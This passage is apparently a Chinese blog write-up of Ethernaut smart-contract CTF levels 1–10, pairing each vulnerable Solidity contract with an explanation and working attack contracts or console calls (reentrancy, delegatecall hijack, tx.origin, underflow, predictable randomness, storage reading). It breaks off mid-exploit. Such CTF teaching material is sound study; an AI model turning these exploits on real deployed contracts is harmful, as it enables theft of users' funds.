<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Ethernaut 题解 | Banana69</title><meta name="keywords" content="智能合约 CTF"><meta name="author" content="Banana69"><meta name="copyright" content="Banana69"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1. Fallback&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &amp;#x27;@openzeppelin&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&amp;#x27;;contract Fallback &amp;#123;  using SafeMath for uint256;  mapping(address &#x3D;&amp;g">
<meta property="og:type" content="article">
<meta property="og:title" content="Ethernaut 题解">
<meta property="og:url" content="https://banana69.site/2023/02/23/Ethernaut/index.html">
<meta property="og:site_name" content="Banana69">
<meta property="og:description" content="1. Fallback&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &amp;#x27;@openzeppelin&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&amp;#x27;;contract Fallback &amp;#123;  using SafeMath for uint256;  mapping(address &#x3D;&amp;g">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2023-02-22T16:00:00.000Z">
<meta property="article:modified_time" content="2023-02-23T13:40:06.430Z">
<meta property="article:author" content="Banana69">
<meta property="article:tag" content="智能合约 CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://banana69.site/2023/02/23/Ethernaut/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Ethernaut 题解',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-02-23 21:40:06'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Banana69" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/cat.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Banana69</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Ethernaut 题解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2023-02-22T16:00:00.000Z" title="发表于 2023-02-23 00:00:00">2023-02-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>46分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Ethernaut 题解"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h3 id="1-Fallback"><a href="#1-Fallback" class="headerlink" title="1. Fallback"></a>1. Fallback</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这道题目的要求是取出合约中所有的 ether，但是需要通过 onlyowner 的检查，可以注意到在 <code>receive</code>函数中，<code>owner = msg.sender</code>，所以可以首先向合约中转入ether成为owner，即调用<code>contribute</code>函数转入 ether，然后再调用<code>withdraw</code>函数即可完成该题目。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.contribute(&#123;<span class="attr">value</span>: toWei(<span class="number">0.0005</span>)&#125;)</span><br><span class="line"><span class="comment">//contract.sendTransaction(&#123;value: 1&#125;)</span></span><br><span class="line">contract.withdraw()</span><br></pre></td></tr></table></figure>



<h3 id="2-Fallout"><a href="#2-Fallout" class="headerlink" title="2. Fallout"></a>2. Fallout</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> /*</span><br><span class="line"> constructor</span><br><span class="line"> */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        require(</span><br><span class="line">	            msg.sender == owner,</span><br><span class="line">	            &quot;caller is not the owner&quot;</span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题要求获取合约的所有权，直接调用<code>Fal1out</code>函数就可以成为 owner。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.Fal1out()</span><br></pre></td></tr></table></figure>



<h3 id="3-Coin-Flip"><a href="#3-Coin-Flip" class="headerlink" title="3. Coin Flip"></a>3. Coin Flip</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>

<p>连续猜对 10 次硬币的正反就可以通过该题目。在题目中 <code>flip</code>会获取到前一区块的哈希值去计算硬币的正反，而而每一个随机数都是可知的，所以可以可以预测随机数。</p>
<p>攻击合约：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">	function flip(bool _guess) public returns(bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit &#123;</span><br><span class="line">		 CoinFlip hack;</span><br><span class="line">     constructor(address instance) public &#123;</span><br><span class="line">        hack = CoinFlip(instance);</span><br><span class="line">    &#125;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    function guessFlip() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        hack.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用<code>guessFlip</code> 10 次即可通过该题目。</p>
<h3 id="4-Telephone"><a href="#4-Telephone" class="headerlink" title="4. Telephone"></a>4. Telephone</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tx.origin</code>表示发起交易的用户账户，<code>msg.sender</code>可以表示合约的地址，想要使<code>tx.origin != msg.sender</code>，只需要部署一个合约在合约中调用<code>changeOwner</code>函数即可。</p>
<p>攻击合约：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">  function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Caller &#123;</span><br><span class="line">    Telephone hack;</span><br><span class="line">    constructor(address victim) public &#123;</span><br><span class="line">        hack = Telephone(victim);</span><br><span class="line">        hack.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="5-Token"><a href="#5-Token" class="headerlink" title="5. Token"></a>5. Token</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这道题目的要求是增加 token 的数量，在<code>transfer</code>函数处可以改变 token 的数量，在合约中未使用<code>safemath</code>库，所以在<code>balances[msg.sender] -= _value;</code>处可以造成溢出，调用<code>transfer</code>函数即可。</p>
<p>由于一开始有20个token，使用<code>transfer</code>函数减去<code>21</code>就会造成溢出。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.transfer(level,<span class="number">21</span>)</span><br></pre></td></tr></table></figure>



<h3 id="6-Delegation"><a href="#6-Delegation" class="headerlink" title="6. Delegation"></a>6. Delegation</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) public &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) public &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题目要求获得合约的所有权，由于我们无法直接调用<code>pwn()</code>函数，所以只能通过<code>Delegation</code>合约的回掉函数中的<code>delegatecall</code>发起调用，<code>delegatecall</code>的执行环境在合约<code>Delegation</code>中，而 <code>msg.data</code>又是可控的，直接用 <code>bytes4(keccak256(&quot;pwn()&quot;))</code> 即可通过 <code>delegatecall()</code> 将已部署的 Delegation <code>owner</code> 修改为攻击者自己（msg.sender)。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.sendTransaction(&#123;<span class="attr">data</span>: web3.utils.sha3(<span class="string">&quot;pwn()&quot;</span>).slice(<span class="number">0</span>,<span class="number">10</span>)&#125;);</span><br></pre></td></tr></table></figure>

<p>以下是俩种调用方式的区别：</p>
<p><img src="/image/Ethernaut.assets/image-20220902101423276.png" alt="image-20220902101423276"></p>
<h3 id="7-Force"><a href="#7-Force" class="headerlink" title="7. Force"></a>7. Force</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure>

<p>这道题目要求合约中的余额大于0。使用<code>selfdestruct</code>方法就可以强制将合约中的余额转入某个账户。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">   constructor() payable public &#123;</span><br><span class="line">       require(msg.value &gt; 0);</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">  function exploit(address payable _target) public payable &#123;</span><br><span class="line">      selfdestruct(_target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="8-Vault"><a href="#8-Vault" class="headerlink" title="8. Vault"></a>8. Vault</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) public &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题要求打开valult，调用<code>unlock</code>可以进行解锁，但是需要 <code>password</code>，利用 web3py 可以获取到 password 的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, EthereumTesterProvider</span><br><span class="line"></span><br><span class="line">web = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://rinkeby.infura.io/v3/&#x27;</span>))</span><br><span class="line">checkConnect = web.isConnected()</span><br><span class="line">web3 = web.eth</span><br><span class="line"></span><br><span class="line">address = <span class="string">&quot;0xCe21072C0010feF4CB6C03F8FC03E944e39Ee17B&quot;</span></span><br><span class="line"><span class="built_in">print</span>(Web3.toText(web3.get_storage_at(address, <span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(Web3.toHex(web3.get_storage_at(address, <span class="number">1</span>)))</span><br><span class="line"><span class="comment">#A very strong secret password :)</span></span><br><span class="line"><span class="comment">#0x412076657279207374726f6e67207365637265742070617373776f7264203a29</span></span><br></pre></td></tr></table></figure>

<p>然后调用<code>unlock</code>函数即可，由于web3.js不能自动把string解析成byte32类型，所以将 bytes 类型的 <code>password</code>作为参数传入。</p>
<h3 id="9-King"><a href="#9-King" class="headerlink" title="9. King"></a>9. King</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价。阻止其他人重获王位来通过这一关。</p>
<p>在<code>receive</code>函数中可以接收 prize，当prize 大于当前的 king 的prize时就会成为king，如果要阻止其他人成为king，可以在fallback 或者 receive 函数中写入 <code>revert()</code>，使<code>king.transfer(msg.value)</code>失败。</p>
<p><img src="/image/Ethernaut.assets/image-20220903131148062.png" alt="image-20220903131148062"></p>
<p>在创建后的第一个king 的prize 为 0.001 ether，只要发送大于 0.001的 ether即可</p>
<p>攻击合约：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Exploit &#123;</span><br><span class="line">    constructor(address payable _King) payable public &#123;</span><br><span class="line">        _King.call.value(1 ether).gas(1000000)(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    fallback() payable external&#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10. Re-entrancy"></a>10. Re-entrancy</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题考查的重入漏洞，由于在<code>withdraw</code>函数中，首先进行转账操作，然后才将对应账户的余额减去。而且这里的转账利用了<code>call</code>方法，没有 gas 的限制，使用 <code>call</code>进行转账时 EVM 将所有的 gas都用来进行转账。</p>
<p>solidity 中还有其他俩种转账方式：</p>
<ul>
<li><p><strong>transfer：</strong></p>
<p>要求接收的智能合约中必须有一个<code>fallback</code>或者<code>receive</code>函数，否则会抛出一个错误(error)，并且revert。而且有单笔交易中的操作总gas不能超过2300的限制。transfer 还会在以下俩种情况下抛出错误：</p>
<ul>
<li>付款方合约的余额不足，小于所要发送的value</li>
<li>接收方合约拒绝接收支付</li>
</ul>
</li>
<li><p><strong>send：</strong></p>
<p>和transfer函数的工作方式基本一样，唯一的区别在于，当出现上述两种交易失败的情况时，send的返回结果是一个boolean值，而不会执行revert回滚。</p>
</li>
</ul>
<p>我们只需要在<code>fallback</code>中重复调用<code>withdraw    </code>函数即可将合约中所有的余额转出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Exploit &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    IReentrance target;</span><br><span class="line">    uint targetValue = 1000000000000000 wei;</span><br><span class="line"></span><br><span class="line">    constructor(address _targetAddr) public&#123;</span><br><span class="line">        target = IReentrance(_targetAddr);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donateAndWithdraw() public payable&#123;</span><br><span class="line">        require(msg.value &gt;= targetValue);</span><br><span class="line">        target.donate.value(msg.value)(address(this));</span><br><span class="line">        target.withdraw(msg.value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        target.withdraw(targetValue);</span><br><span class="line">    &#125;</span><br><span 